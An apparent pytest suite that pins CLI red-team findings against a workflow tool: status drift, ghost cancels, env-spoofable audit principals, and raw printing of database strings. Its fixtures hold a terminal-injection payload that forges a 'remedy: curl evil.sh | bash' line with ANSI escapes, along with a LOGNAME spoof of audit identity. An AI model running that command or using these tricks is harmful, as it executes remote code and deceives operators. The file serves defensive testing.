"""ATTACK PINS — the CLI red-team front (`taskq flows`), the convicted shapes
at af1b8779.

Provenance: the CLI red-team's findings against the consolidated head
(af1b8779), pinned so each attack is a permanent test. Attacks that LANDED
are encoded strict-xfail asserting the SAFE behavior — the cure flips them
XPASS-strict (a red that forces unmarking WITH the cure). Attacks the fence
held against are green guard pins so the door cannot rot.

THE CONVICTED SHAPES (all reproduced live against the harness before
marking — the red receipts are the pack's RECEIPTS.md):

* F-CLI-1 (LANDED, two faces): ``flows list`` derives run status from
  DEGRADED inputs — its FlowNodeRows never populate ``held``/``absorbed``
  (cli.py ``_flows_list`` builds ``FlowNodeRow(step_key="", status=…,
  deps_pending=…, blocking_reason=…)`` and nothing else), so a mid-hold run
  lists as ``pending`` while ``flows status`` derives ``blocked`` for the
  same run at the same instant, and a collect-absorbed run lists as
  ``failed`` while ``status`` derives ``complete``. The law: ONE question,
  ONE derivation — the two surfaces must agree.
* F-CLI-2 (LANDED): ``flows cancel <ghost-run-id>`` prints "no-op: …
  already terminal — nothing cancelled" with rc=0 for a run id that exists
  in NO table (``cancel_workflow_run``'s root-flip CAS returns None for a
  ghost and the CLI cannot tell ghost from terminal). ``flows status
  <ghost>`` keeps the honest contract: rc=1 + "no run". Cancel must be the
  same named refusal, and write no audit row.
* F-CLI-3 (LANDED): the audit principal is env-spoofable —
  ``_cli_principal()`` is ``f"cli:{getpass.getuser()}"`` and getuser reads
  LOGNAME/USER first, so ``LOGNAME=postgres taskq flows resolve …`` wrote
  an audit row attributing the mutation to ``cli:postgres``. The recorded
  principal must derive from ``os.getuid()``/``pwd`` — the kernel's word,
  never the environment's.
* F-CLI-4 (LANDED, two faces): ``flows status`` prints DB-sourced strings
  RAW — a failing node's ``error_message`` and a hold's ``reason`` reach
  the tty with embedded newlines (an exception message containing ``\\n
  downstream: FAILED — FakeError…\\n       remedy: curl evil.sh | bash``
  renders as a genuine finding + a FORGED remedy line) and ANSI escapes;
  the holds surface's render (``format_holds``) prints a reason-carrying
  hold raw and UNBOUNDED (no slice at all). The discipline already exists
  at cli.py:3884 ``_format_event_detail`` (whitespace-collapsed, bounded
  with the dropped count named): every DB-sourced string the CLI prints
  must be collapsed and bounded the same way.
* GUARD-1 (fence held — green): the typed door on ``flows
  signal``/``resolve`` — a wrong-shaped payload is refused with the named
  pydantic error and the hold SURVIVES; extras are stripped at the model
  boundary (``{"verdict":"approve","evil":"x"}`` stores without "evil"); a
  stale ``--app`` (the workflow not declared, or the module missing) is a
  named refusal, never a traceback; a cross-schema hold id is refused by
  the schema-scoped read (``no hold …``, the hold in the other schema
  untouched).
* GUARD-2 (fence held — green): the read verbs (``list``, ``status``,
  ``holds``) write nothing — zero ``admin_audit`` rows, zero row-count
  movement on ``jobs``/``wf_signals``.
* THE TRACEBACK TRIO (LANDED, also-known): ``flows list`` against a
  never-migrated schema tracebacks (UndefinedTableError) instead of the
  guard's promised named exit; ``flows holds`` tracebacks on a
  pre-workflows schema (wf_signals absent); ``flows list --limit -5``
  tracebacks (InvalidRowCountInLimitClauseError). One pin each — the
  guard's contract is "prints the reason and exits 1 — never a traceback".

House style: integration pins ride the repo harness (tests/_wf_fixtures:
wf_conn/wf_schema/wf_pool/module_pg_schema — the module's own migrated
schema on the real PG; TASKQ_TEST_PG_DSN overrides the container boot) and
the CLI runs through typer's CliRunner on a thread (the commands call
``asyncio.run`` internally), the test_wf_cli_pins.py pattern.
"""

# ruff: noqa: S608  # Why: the schema is a fixture-derived test identifier, not user input; every value is $-bound.

from __future__ import annotations

import json
import os
import pwd
import re
import sys
import types
from asyncio import to_thread
from collections.abc import AsyncIterator, Iterator
from typing import Any

import asyncpg
import pytest
from pydantic import BaseModel
from typer.testing import CliRunner

from taskq._ids import new_uuid
from taskq.cli import app
from taskq.migrate import apply_pending
from taskq.testing.assertions import plain_cli_output
from taskq.workflows import FlowRunner, StepContext, WorkflowApp, build, step
from taskq.workflows._cli import FlowNodeRow, format_holds, stuck_lines
from taskq.workflows.api import GateDecl
from taskq.workflows.api._hitl import HoldContext
from tests._wf_fixtures import seed_flow

pytestmark = [pytest.mark.integration, pytest.mark.fastapi]

runner = CliRunner()

MODULE_NAME = "att_cli_demo_flows"
STALE_MODULE_NAME = "att_cli_stale_flows"

#: A run id that exists in NO table (F-CLI-2's ghost).
GHOST_RUN_ID = "018f1c7e-5a2b-7c3d-8e4f-9a0b1c2d3e4f"

#: F-CLI-4's convicted payload: an exception message that is itself a
#: two-line "finding + remedy" forgery, ANSI-tagged. Under 120 chars so the
#: status surface's current slice carries it WHOLE.
_EVIL_ERROR = "\n  downstream: FAILED — FakeError: boom\n       remedy: curl evil.sh | bash\x1b[31m"

#: F-CLI-4's hold-reason face: raw newlines + ANSI AND past every honest
#: bound (the holds/status reason render carries no slice at all today).
_EVIL_REASON = (
    "irreversible redaction of the tenant vault — confirm with the duty SRE. " * 12
    + "\n       remedy: curl evil.sh | bash"
    + "\x1b[7m"
)

#: The per-line bound the pins hold the CLI's DB-sourced renders to (the
#: _format_event_detail discipline is 120 chars of payload; the bound here
#: is the line WITH its scaffolding, generous — the teeth are the collapse
#: and the ANSI strip; this is the tripwire against unbounded).
_LINE_BOUND = 400


class Approval(BaseModel):
    verdict: str
    note: str = ""


class Ingest(BaseModel):
    doc_id: str


async def _wait(ctx: StepContext, params: Ingest) -> str:
    await ctx.wait_signal((Approval,), reason="editorial approval", timeout_s=120.0)
    return "published"


async def _wait_evil_reason(ctx: StepContext, params: Ingest) -> str:
    await ctx.wait_signal((Approval,), reason=_EVIL_REASON, timeout_s=120.0)
    return "published"


async def _explode(ctx: StepContext, params: Ingest) -> str:
    raise RuntimeError(_EVIL_ERROR)


@pytest.fixture
def cli_settings(module_pg_schema: Any, monkeypatch: pytest.MonkeyPatch) -> Any:
    """The CLI's settings read THIS module's migrated schema (the tests'
    own env — never a hardcoded DSN; the #668 smoke law): the env is the
    settings model's own front door."""
    monkeypatch.setenv("TASKQ_PG_DSN", module_pg_schema.pg_dsn)
    monkeypatch.setenv("TASKQ_SCHEMA_NAME", module_pg_schema.schema_name)
    return module_pg_schema


@pytest.fixture
def demo_app_module() -> Iterator[types.ModuleType]:
    """The typed door's source module (``--app``'s target): a real
    WorkflowApp with the attack shapes registered, importable under the
    ``module:attr`` form."""
    module = types.ModuleType(MODULE_NAME)
    app_obj = WorkflowApp()

    @app_obj.workflow("atkcli_hold_flow")
    def hold_flow() -> object:
        gate = GateDecl(name="Approval", payload_models=(Approval,), timeout_s=120.0)
        return build(step(_wait, Ingest(doc_id="d1"), key="review", gates=(gate,)))

    @app_obj.workflow("atkcli_reason_flow")
    def reason_flow() -> object:
        gate = GateDecl(name="Approval", payload_models=(Approval,), timeout_s=120.0)
        return build(step(_wait_evil_reason, Ingest(doc_id="d1"), key="review", gates=(gate,)))

    @app_obj.workflow("atkcli_fail_flow")
    def fail_flow() -> object:
        return build(step(_explode, Ingest(doc_id="d1"), key="doomed", max_attempts=1))

    module.app = app_obj  # type: ignore[attr-defined]  # Why: the module:attr contract's dynamic half.
    sys.modules[MODULE_NAME] = module
    yield module
    del sys.modules[MODULE_NAME]


@pytest.fixture
def stale_app_module() -> Iterator[types.ModuleType]:
    """The stale-deploy ``--app``: a WorkflowApp that does NOT declare the
    run's workflow (GUARD-1's stale-door shape)."""
    module = types.ModuleType(STALE_MODULE_NAME)
    app_obj = WorkflowApp()

    @app_obj.workflow("atkcli_unrelated_flow")
    def unrelated() -> object:
        return build(step(_wait, Ingest(doc_id="d1"), key="review"))

    module.app = app_obj  # type: ignore[attr-defined]
    sys.modules[STALE_MODULE_NAME] = module
    yield module
    del sys.modules[STALE_MODULE_NAME]


async def _held_run(wf_pool: Any, wf_schema: str, *, name: str = "atkcli_hold_flow") -> str:
    """A real run driven to its hold; the run id (str) is the CLI's address."""
    compiled = sys.modules[MODULE_NAME].app.get(name)  # type: ignore[attr-defined]
    flow_runner = FlowRunner(compiled, wf_pool, wf_schema)
    flow_id = (await flow_runner.create_flow()).flow_id
    await flow_runner.drive(flow_id, until="held")
    return str(flow_id)


def _hold_id_of(holds_output: str) -> str:
    """The reply handle from the holds listing (the id IS the handle —
    the parse mirrors the operator's copy-paste)."""
    assert holds_output, f"the holds listing rendered nothing: {holds_output!r}"
    return holds_output.split("hold ")[1].split(" ")[0]


def _status_verdict(status_output: str) -> str:
    """The derived verdict off the status report's header line."""
    match = re.search(r"status:\s*(\w+)", plain_cli_output(status_output))
    assert match, f"no derived status in the status report: {status_output!r}"
    return match.group(1)


def _list_verdict(list_output: str, run_id: str) -> str:
    """The derived status off the run's OWN list line."""
    line = next((ln for ln in list_output.splitlines() if run_id in ln), None)
    assert line is not None, f"run {run_id} absent from the list: {list_output!r}"
    return line.split()[1]


def _named_refusal(result: Any) -> bool:
    """The refusal contract the flows guard promises: a clean exit (typer
    surfaces it as SystemExit under the runner), never a raw driver
    exception — and a printed reason, never silence."""
    exc_clean = result.exception is None or isinstance(result.exception, SystemExit)
    return exc_clean and bool(plain_cli_output(result.output).strip())


# ── F-CLI-1: the list/status derivation drift (LANDED, two faces) ────────


# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-1 (held) — the list's held join, one derivation]; the marker is removed per the designed flip (the confirmation receipt).
async def test_f_cli_1_list_and_status_agree_for_a_held_run(
    cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
) -> None:
    """F-CLI-1, held face: drive a run until="held"; `flows status` derives
    'blocked'; the run's `flows list` line must say the SAME — one
    derivation, two surfaces, no drift."""
    run_id = await _held_run(wf_pool, wf_schema)
    status_res = await to_thread(runner.invoke, app, ["flows", "status", run_id])
    assert status_res.exit_code == 0, status_res.output
    list_res = await to_thread(runner.invoke, app, ["flows", "list"])
    assert list_res.exit_code == 0, list_res.output
    status_verdict = _status_verdict(status_res.output)
    list_verdict = _list_verdict(list_res.output, run_id)
    assert list_verdict == status_verdict == "blocked", (
        f"F-CLI-1: the surfaces disagree on a held run — status derives "
        f"{status_verdict!r} but list prints {list_verdict!r} for run {run_id} "
        "(the list's FlowNodeRows never populate held=, so the derivation "
        "degrades to 'pending')"
    )


# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-1 (absorbed) — the list's absorbed EXISTS, one derivation]; the marker is removed per the designed flip (the confirmation receipt).
async def test_f_cli_1_list_and_status_agree_for_an_absorbed_run(
    cli_settings: Any, wf_conn: asyncpg.Connection, wf_schema: str
) -> None:
    """F-CLI-1, absorbed face: a completed collect run carries a failed
    child whose failure the edge ledger absorbed ('collect' policy). The
    status surface reads the absorption record (wf_edge.failure_policy)
    and derives 'complete'; the list must agree."""
    flow_id = await seed_flow(wf_conn, wf_schema, status="succeeded", workflow="atkcli_absorbed")
    # The absorbed child: terminal-failed, its failure ON THE RECORD (the
    # edge ledger's declared 'collect' policy — _absorbed_exists's read).
    failed_node = new_uuid()
    await wf_conn.execute(
        f'INSERT INTO "{wf_schema}".jobs (id, actor, queue, payload, max_attempts, '
        "retry_kind, status, step_key, metadata, error_class, error_message, attempt) "
        "VALUES ($1, 'wf', 'default', '{}', 3, 'transient', 'failed', 'worker', "
        "$2::jsonb, 'FakeError', 'boom', 3)",
        failed_node,
        json.dumps({"flow_id": str(flow_id)}),
    )
    collect_node = new_uuid()
    await wf_conn.execute(
        f'INSERT INTO "{wf_schema}".jobs (id, actor, queue, payload, max_attempts, '
        "retry_kind, status, step_key, metadata) VALUES ($1, 'wf', 'default', '{}', "
        "3, 'transient', 'succeeded', 'collect', $2::jsonb)",
        collect_node,
        json.dumps({"flow_id": str(flow_id)}),
    )
    await wf_conn.execute(
        f'INSERT INTO "{wf_schema}".wf_edge (child_id, parent_id, flow_id, failure_policy) '
        "VALUES ($1, $2, $3, 'collect')",
        collect_node,
        failed_node,
        flow_id,
    )
    status_res = await to_thread(runner.invoke, app, ["flows", "status", str(flow_id)])
    assert status_res.exit_code == 0, status_res.output
    list_res = await to_thread(runner.invoke, app, ["flows", "list"])
    assert list_res.exit_code == 0, list_res.output
    status_verdict = _status_verdict(status_res.output)
    list_verdict = _list_verdict(list_res.output, str(flow_id))
    assert list_verdict == status_verdict == "complete", (
        f"F-CLI-1: the surfaces disagree on a collect-absorbed run — status "
        f"derives {status_verdict!r} but list prints {list_verdict!r} for run "
        f"{flow_id} (the list read never fetches the absorption record)"
    )


# ── F-CLI-2: ghost-cancel is a silent no-op (LANDED) ─────────────────────


# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-2 — the ghost cancel's honest rc=1]; the marker is removed per the designed flip (the confirmation receipt).
async def test_f_cli_2_cancel_of_a_ghost_run_is_a_named_refusal(
    cli_settings: Any, wf_conn: asyncpg.Connection, wf_schema: str
) -> None:
    """F-CLI-2: a cancel addressed at a run that exists in NO table must be
    the SAME named refusal `status` gives (rc=1, 'no run'), and write no
    audit row — a no-op rc=0 report manufactures an operator's belief that
    the run existed and was already done."""
    # The contrast baseline (the honest contract, GREEN today and after).
    status_res = await to_thread(runner.invoke, app, ["flows", "status", GHOST_RUN_ID])
    assert status_res.exit_code == 1
    assert "no run" in plain_cli_output(status_res.output)

    cancel_res = await to_thread(runner.invoke, app, ["flows", "cancel", GHOST_RUN_ID])
    audit_rows = await wf_conn.fetchval(
        f'SELECT count(*) FROM "{wf_schema}".admin_audit WHERE target_id = $1',
        GHOST_RUN_ID,
    )
    assert cancel_res.exit_code == 1, (
        f"F-CLI-2: cancel of a ghost run exited {cancel_res.exit_code} with "
        f"{cancel_res.output.strip()!r} — a run id that exists in NO table is "
        "not 'already terminal', it is NO RUN (the status surface keeps this "
        "contract; cancel must too)"
    )
    assert "no run" in plain_cli_output(cancel_res.output)
    assert audit_rows == 0, "a ghost cancel must not leave an audit row"


# ── F-CLI-3: the audit principal is env-spoofable (LANDED) ───────────────


# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-3 — the principal is getuid-derived (the kernel's word)]; the marker is removed per the designed flip (the confirmation receipt).
async def test_f_cli_3_the_audit_principal_derives_from_the_uid_not_the_env(
    cli_settings: Any,
    wf_conn: asyncpg.Connection,
    wf_pool: Any,
    wf_schema: str,
    demo_app_module: Any,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """F-CLI-3: set LOGNAME/USER to a spoofed identity, run a REAL resolve
    through the CLI, and read the audit row: the recorded principal must be
    the uid-derived user (pwd.getpwuid(os.getuid())), never the env's."""
    pw_name = pwd.getpwuid(os.getuid()).pw_name
    spoof = "postgres" if pw_name != "postgres" else "spoofed_operator"
    monkeypatch.setenv("LOGNAME", spoof)
    monkeypatch.setenv("USER", spoof)

    run_id = await _held_run(wf_pool, wf_schema)
    holds = await to_thread(runner.invoke, app, ["flows", "holds", run_id])
    hold_id = _hold_id_of(holds.output)
    res = await to_thread(
        runner.invoke,
        app,
        [
            "flows",
            "resolve",
            hold_id,
            '{"verdict":"approve"}',
            "--app",
            f"{MODULE_NAME}:app",
            "--reason",
            "the operator approves",
        ],
    )
    assert res.exit_code == 0, res.output  # the spoof does not block the door
    audit = await wf_conn.fetchrow(
        f"SELECT principal_subject FROM \"{wf_schema}\".admin_audit WHERE action = 'hitl.resolve'",
    )
    assert audit is not None, "a resolve without an audit row reds"
    assert audit["principal_subject"] == f"cli:{pw_name}", (
        f"F-CLI-3: the audit row attributes the mutation to "
        f"{audit['principal_subject']!r} — the env's LOGNAME/USER ({spoof!r}) "
        f"reached the audit trail; the principal must derive from "
        f"os.getuid()/pwd ({pw_name!r}), the kernel's word"
    )


# ── F-CLI-4: DB-sourced strings print RAW (LANDED, two faces) ────────────


# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-4 (the status face) — the error text through _bounded_line]; the marker is removed per the designed flip (the confirmation receipt).
async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
    cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
) -> None:
    """F-CLI-4, error_message face: a node fails with an exception whose
    message IS a two-line finding+remedy forgery (ANSI-tagged). The status
    report must render it as ONE collapsed, bounded finding line — never a
    standalone forged 'remedy:' line, never an ESC byte."""
    compiled = sys.modules[MODULE_NAME].app.get("atkcli_fail_flow")  # type: ignore[attr-defined]
    flow_runner = FlowRunner(compiled, wf_pool, wf_schema)
    flow_id = (await flow_runner.create_flow()).flow_id
    await flow_runner.drive(flow_id)

    res = await to_thread(runner.invoke, app, ["flows", "status", str(flow_id)])
    assert res.exit_code == 0, res.output
    # The RAW output (plain_cli_output would collapse away the very evidence).
    forged = [ln for ln in res.output.splitlines() if "evil.sh" in ln and "doomed" not in ln]
    assert not forged, (
        f"F-CLI-4: the DB-sourced error text forged its own line(s) in the "
        f"status report: {forged} — an exception message must render INSIDE "
        "the collapsed finding line, never as a standalone remedy"
    )
    # The render-layer half (where the discipline lives; CliRunner's stream
    # strips ANSI on its own, so the ESC assertion belongs on the pure
    # render — the layer a tty prints from verbatim).
    rendered = stuck_lines(
        FlowNodeRow(
            step_key="doomed",
            status="failed",
            error_class="RuntimeError",
            error_message=_EVIL_ERROR,
            max_attempts=1,
            attempt=1,
        ),
        str(flow_id),
    )
    assert rendered, "a failed node is a finding"
    assert all("\n" not in ln and "\r" not in ln and "\x1b" not in ln for ln in rendered), (
        f"F-CLI-4: the render layer passes DB-sourced text through raw: {rendered}"
    )
    assert all(len(ln) <= _LINE_BOUND for ln in rendered)


# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [F-CLI-4 (the holds face) — the reason through _bounded_line]; the marker is removed per the designed flip (the confirmation receipt).
async def test_f_cli_4_holds_collapses_and_bounds_db_sourced_reason_text(
    cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
) -> None:
    """F-CLI-4, hold-reason face: the reason rides the wait context into
    wf_signals and prints raw on the surfaces that show it. The LIVE
    surface today is `flows status` (``_held_context`` extracts the reason
    from the payload doc); the holds side's seam is the render layer
    itself — ``HitlClient._context`` hardcodes ``reason=None`` on the
    enumeration today, so the CLI's holds listing cannot carry it, but
    ``format_holds`` prints a reason-carrying context raw and unbounded
    (the discipline the seam owes, pinned where it belongs)."""
    run_id = await _held_run(wf_pool, wf_schema, name="atkcli_reason_flow")

    # THE LIVE SURFACE: `flows status` renders the reason — raw today.
    res = await to_thread(runner.invoke, app, ["flows", "status", run_id])
    assert res.exit_code == 0, res.output
    lines = res.output.splitlines()
    forged = [ln for ln in lines if "evil.sh" in ln and "reason:" not in ln]
    assert not forged, f"F-CLI-4: the hold reason forged its own line(s) in flows status: {forged}"
    assert all(len(ln) <= _LINE_BOUND for ln in lines), (
        f"F-CLI-4: the hold reason renders UNBOUNDED in flows status: longest "
        f"line is {max(len(ln) for ln in lines)} chars"
    )
    # THE RENDER LAYER for the holds surface (the ANSI half — observable
    # here, not under the runner's stripping stream).
    hold = HoldContext(
        hold_id="h-1",
        run_id=run_id,
        node_key="review",
        signal_name="Approval",
        hold_epoch=1,
        call_id="c",
        payload=None,
        payload_schema=None,
        reason=_EVIL_REASON,
        created_at=None,
        expires_at=None,
        status="held",
    )
    rendered = format_holds([hold], run_id=run_id)
    assert all("\n" not in ln and "\r" not in ln and "\x1b" not in ln for ln in rendered), (
        f"F-CLI-4: the holds render passes the DB-sourced reason through raw: {rendered}"
    )
    assert all(len(ln) <= _LINE_BOUND for ln in rendered), (
        f"F-CLI-4: the holds render is unbounded: {max(len(ln) for ln in rendered)} chars"
    )


# ── GUARD-1: the typed door on signal/resolve (fence held — green) ───────


async def test_guard_1_the_typed_door_refuses_bad_shapes_and_strips_extras(
    cli_settings: Any,
    wf_conn: asyncpg.Connection,
    wf_pool: Any,
    wf_schema: str,
    demo_app_module: Any,
    stale_app_module: Any,
    module_pg_schema: Any,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """GUARD-1 (the fence held): the typed door's four refusals + the
    strip. A wrong-shaped payload answers the named pydantic error and the
    hold SURVIVES; a stale --app (undeclared workflow, missing module) is a
    named refusal, never a traceback; a hold id from ANOTHER schema is the
    named 'no hold' refusal and the real hold is untouched; and a payload
    with extra keys is delivered WITHOUT the extras (the model boundary
    strips them)."""
    run_id = await _held_run(wf_pool, wf_schema)
    holds = await to_thread(runner.invoke, app, ["flows", "holds", run_id])
    hold_id = _hold_id_of(holds.output)

    # 1. THE WRONG SHAPE: named pydantic error, exit 1, the hold survives.
    wrong = await to_thread(
        runner.invoke,
        app,
        ["flows", "resolve", hold_id, '{"verdict": 42}', "--app", f"{MODULE_NAME}:app"],
    )
    assert wrong.exit_code == 1
    assert "pydantic refused the payload" in plain_cli_output(wrong.output)
    still_held = await wf_conn.fetchval(
        f'SELECT status FROM "{wf_schema}".wf_signals WHERE id = $1', hold_id
    )
    assert still_held == "held", "a refused delivery moved the hold"

    # 2. THE STALE DOOR: the app that does not declare the run's workflow —
    # the named refusal, never a KeyError traceback.
    stale = await to_thread(
        runner.invoke,
        app,
        ["flows", "resolve", hold_id, '{"verdict":"approve"}', "--app", f"{STALE_MODULE_NAME}:app"],
    )
    assert stale.exit_code == 1
    assert _named_refusal(stale), f"the stale-app refusal leaked: {stale.exception!r}"
    assert "typed door" in plain_cli_output(stale.output)
    # … and the module that does not exist at all.
    missing = await to_thread(
        runner.invoke,
        app,
        ["flows", "resolve", hold_id, '{"verdict":"approve"}', "--app", "no_such_module_xyz:app"],
    )
    assert missing.exit_code == 1
    assert _named_refusal(missing), f"the missing-module refusal leaked: {missing.exception!r}"
    assert "module not found" in plain_cli_output(missing.output)

    # 3. THE CROSS-SCHEMA DOOR: the hold id addressed against a SECOND
    # migrated schema (the id exists in NO table THERE) — the named 'no
    # hold' refusal; the real hold (in the module's schema) is untouched.
    xs_schema = f"{wf_schema}_xs"
    conn = await asyncpg.connect(module_pg_schema.pg_dsn)
    try:
        await conn.execute(f'DROP SCHEMA IF EXISTS "{xs_schema}" CASCADE')
        await conn.execute(f'CREATE SCHEMA "{xs_schema}"')
        await apply_pending(conn, schema=xs_schema)
    finally:
        await conn.close()
    try:
        monkeypatch.setenv("TASKQ_SCHEMA_NAME", xs_schema)
        cross = await to_thread(
            runner.invoke,
            app,
            ["flows", "resolve", hold_id, '{"verdict":"approve"}', "--app", f"{MODULE_NAME}:app"],
        )
        assert cross.exit_code == 1
        assert _named_refusal(cross), f"the cross-schema refusal leaked: {cross.exception!r}"
        assert "no hold" in plain_cli_output(cross.output)
    finally:
        monkeypatch.setenv("TASKQ_SCHEMA_NAME", wf_schema)
        conn = await asyncpg.connect(module_pg_schema.pg_dsn)
        try:
            await conn.execute(f'DROP SCHEMA IF EXISTS "{xs_schema}" CASCADE')
        finally:
            await conn.close()
    still_held = await wf_conn.fetchval(
        f'SELECT status FROM "{wf_schema}".wf_signals WHERE id = $1', hold_id
    )
    assert still_held == "held", "the cross-schema refusal touched the real hold"

    # 4. THE STRIP: extras never cross the model boundary — the delivered
    # payload is the validated model's dump, not the caller's dict. Both
    # doors (resolve by id, signal by run+node) strip identically.
    resolved = await to_thread(
        runner.invoke,
        app,
        [
            "flows",
            "resolve",
            hold_id,
            '{"verdict":"approve","evil":"x"}',
            "--app",
            f"{MODULE_NAME}:app",
        ],
    )
    assert resolved.exit_code == 0, resolved.output
    stored = await wf_conn.fetchval(
        f'SELECT payload FROM "{wf_schema}".wf_signals WHERE id = $1', hold_id
    )
    stored_payload = json.loads(stored) if isinstance(stored, str) else stored
    assert "evil" not in stored_payload, f"an extra crossed the door: {stored_payload}"
    assert stored_payload["verdict"] == "approve"

    run_id2 = await _held_run(wf_pool, wf_schema)
    signaled = await to_thread(
        runner.invoke,
        app,
        [
            "flows",
            "signal",
            run_id2,
            "review",
            '{"verdict":"approve","evil":"y"}',
            "--app",
            f"{MODULE_NAME}:app",
        ],
    )
    assert signaled.exit_code == 0, signaled.output
    stored2 = await wf_conn.fetchval(
        f'SELECT payload FROM "{wf_schema}".wf_signals WHERE workflow_id = $1 '
        "AND status = 'delivered'",
        run_id2,
    )
    stored_payload2 = json.loads(stored2) if isinstance(stored2, str) else stored2
    assert "evil" not in stored_payload2, f"an extra crossed the signal door: {stored_payload2}"


# ── GUARD-2: the read verbs write nothing (fence held — green) ───────────


async def test_guard_2_the_read_verbs_write_nothing(
    cli_settings: Any,
    wf_conn: asyncpg.Connection,
    wf_pool: Any,
    wf_schema: str,
    demo_app_module: Any,
) -> None:
    """GUARD-2 (the fence held): `list`, `status`, `holds` are READS —
    exercising them against a live held run moves zero rows (jobs and
    wf_signals counts unchanged) and writes zero admin_audit rows."""

    async def counts() -> dict[str, int]:
        return {
            "jobs": await wf_conn.fetchval(f'SELECT count(*) FROM "{wf_schema}".jobs'),
            "wf_signals": await wf_conn.fetchval(f'SELECT count(*) FROM "{wf_schema}".wf_signals'),
            "admin_audit": await wf_conn.fetchval(
                f'SELECT count(*) FROM "{wf_schema}".admin_audit'
            ),
        }

    run_id = await _held_run(wf_pool, wf_schema)  # content for all three verbs
    before = await counts()
    for argv in (["flows", "list"], ["flows", "status", run_id], ["flows", "holds", run_id]):
        res = await to_thread(runner.invoke, app, argv)
        assert res.exit_code == 0, (argv, res.output)
    after = await counts()
    assert after == before, (
        f"a read verb wrote: before={before} after={after} — the read-only "
        "contract (the doctor's read-side-only rule) is broken"
    )
    assert after["admin_audit"] == 0, "a read verb left an audit row"


# ── the traceback trio (LANDED, also-known — one pin each) ───────────────


@pytest.fixture(scope="module")
async def nomig_schema(module_pg_schema: Any) -> AsyncIterator[str]:
    """A schema that EXISTS but was never migrated (no taskq tables) — the
    never-migrated shape. Lives in the module's own database (dropped with
    it; the explicit teardown drop is tidiness, not isolation)."""
    name = f"{module_pg_schema.schema_name}_nomig"
    conn = await asyncpg.connect(module_pg_schema.pg_dsn)
    try:
        await conn.execute(f'DROP SCHEMA IF EXISTS "{name}" CASCADE')
        await conn.execute(f'CREATE SCHEMA "{name}"')
    finally:
        await conn.close()
    yield name
    conn = await asyncpg.connect(module_pg_schema.pg_dsn)
    try:
        await conn.execute(f'DROP SCHEMA IF EXISTS "{name}" CASCADE')
    finally:
        await conn.close()


@pytest.fixture(scope="module")
async def prewf_schema(module_pg_schema: Any) -> AsyncIterator[str]:
    """The PRE-WORKFLOWS shape: a schema with a jobs table but NO
    wf_signals (migrated before the workflows estate landed)."""
    name = f"{module_pg_schema.schema_name}_prewf"
    conn = await asyncpg.connect(module_pg_schema.pg_dsn)
    try:
        await conn.execute(f'DROP SCHEMA IF EXISTS "{name}" CASCADE')
        await conn.execute(f'CREATE SCHEMA "{name}"')
        await conn.execute(f'CREATE TABLE "{name}".jobs (id uuid primary key)')
    finally:
        await conn.close()
    yield name
    conn = await asyncpg.connect(module_pg_schema.pg_dsn)
    try:
        await conn.execute(f'DROP SCHEMA IF EXISTS "{name}" CASCADE')
    finally:
        await conn.close()


# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [the trio 1/3 — the unmigrated schema's named remedy]; the marker is removed per the designed flip (the confirmation receipt).
async def test_trio_1_list_on_a_never_migrated_schema_is_a_named_refusal(
    cli_settings: Any, monkeypatch: pytest.MonkeyPatch, nomig_schema: str
) -> None:
    monkeypatch.setenv("TASKQ_SCHEMA_NAME", nomig_schema)
    res = await to_thread(runner.invoke, app, ["flows", "list"])
    assert res.exit_code != 0
    assert _named_refusal(res), (
        f"the never-migrated schema leaked a traceback, not a named refusal: {res.exception!r}"
    )


# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [the trio 2/3 — the pre-workflows holds' named remedy]; the marker is removed per the designed flip (the confirmation receipt).
async def test_trio_2_holds_on_a_pre_workflows_schema_is_a_named_refusal(
    cli_settings: Any, monkeypatch: pytest.MonkeyPatch, prewf_schema: str
) -> None:
    monkeypatch.setenv("TASKQ_SCHEMA_NAME", prewf_schema)
    res = await to_thread(runner.invoke, app, ["flows", "holds", GHOST_RUN_ID])
    assert res.exit_code != 0
    assert _named_refusal(res), (
        f"the pre-workflows schema leaked a traceback, not a named refusal: {res.exception!r}"
    )


# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the cure landed [the trio 3/3 — the negative --limit's named refusal]; the marker is removed per the designed flip (the confirmation receipt).
async def test_trio_3_list_with_a_negative_limit_is_a_named_refusal(
    cli_settings: Any,
) -> None:
    res = await to_thread(runner.invoke, app, ["flows", "list", "--limit", "-5"])
    assert res.exit_code != 0
    assert _named_refusal(res), (
        f"a negative --limit leaked a traceback, not a named refusal: {res.exception!r}"
    )
